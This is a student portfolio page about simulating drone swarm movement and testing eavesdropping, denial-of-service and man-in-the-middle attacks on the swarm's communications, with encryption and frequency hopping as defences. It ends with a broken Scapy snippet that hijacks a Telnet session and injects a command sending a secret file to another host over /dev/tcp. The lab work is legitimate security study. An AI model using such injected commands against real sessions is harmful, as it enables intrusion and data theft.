---
layout: project
type: project
image: img/swarm-vp-wed-pm.jpg
title: "Unmanned Swarms"
date: 2024
published: true
labels:
  - Robotics
  - Simulation
  - C++
  - Python
  - Wireless Attacks
summary: "My team simulated and researched how drone swarm communications could be intercepted wirelessly."
---


My team and I developed a simulation of drone swarm movements using C++. We then conducted tests to explore methods for intercepting the communication between the drones, aiming to assess vulnerabilities in the system and potential defense strategies.

For the simulation, we needed to replicate the movement patterns of unmanned drones. Specifically, we implemented autonomous wall-following, a feature that enables a drone to navigate along a vertical surface, such as a wall, while maintaining a consistent distance. We achieved this by developing an algorithm that allows the drone to detect the proximity of the wall, adjust its trajectory, and follow the contour of the surface. In practical terms, this functionality is especially useful in environments like indoor spaces, tunnels, or urban areas where structures and boundaries are integral to navigation.

Our code incorporated the Gauss Markov mobility model, which adjusts to varying levels of randomness. In this model, speed and direction are derived from a Gaussian-distributed random variable. This approach is effective for simulating the movement of vehicles or drones that exhibit inertia, where future trajectories are influenced by their current state. The model operates within predefined physical boundaries, defined as a 2D box with specific X and Y limits. The mobility model updates the position of each drone at regular time intervals. A smoothing factor balances the randomness and the influence of the previous state in new state calculations. 

We experimented with different types of attacks on the drone swarm communication system with Python scripts. Passive attacks involved eavesdropping on wireless communications without altering data or affecting system operations, allowing us to quietly gather information. We also tested Denial of Service (DoS) attacks by flooding the network or specific devices with excessive traffic to disrupt or disable communication. Lastly, we explored Man-in-the-Middle (MitM) attacks, where communication between two parties was intercepted and potentially altered without their knowledge. 

These experiments helped us assess the vulnerabilities of unmanned drone swarm communication systems. To mitigate these attacks, we implemented several solutions, including strong encryption protocols to secure data transmitted over the wireless network, ensuring confidentiality and integrity. Additionally, we employed Frequency Hopping Spread Spectrum (FHSS), a technique that randomly switches communication frequencies, making it significantly more difficult for attackers to jam or intercept signals, thereby enhancing the resilience of the system.

Here is some code that illustrates how we hijacked the wireless communication:

```py
print("SENDING SESSION HIJACKING PACKET.........")
 IPLayer= IP(src="10.0.2.5", dst="10.0.2.6")                   //set IPS
 TCPLayer= TCP(sport=' ' , dport=23, flags="A",                //set Ports and Flag
 seq=' ', ack=' ')                                             //set sequence and acknowlege
 Data = "\r cat /home/seed/secret > /dev/tcp/10.9.0.1/9090\r"  //set malicious packet
 pkt = IPLayer/TCPLayer/Data                                   //set packet type
 ls(pkt)
 send(pkt,verbose=0) 
```
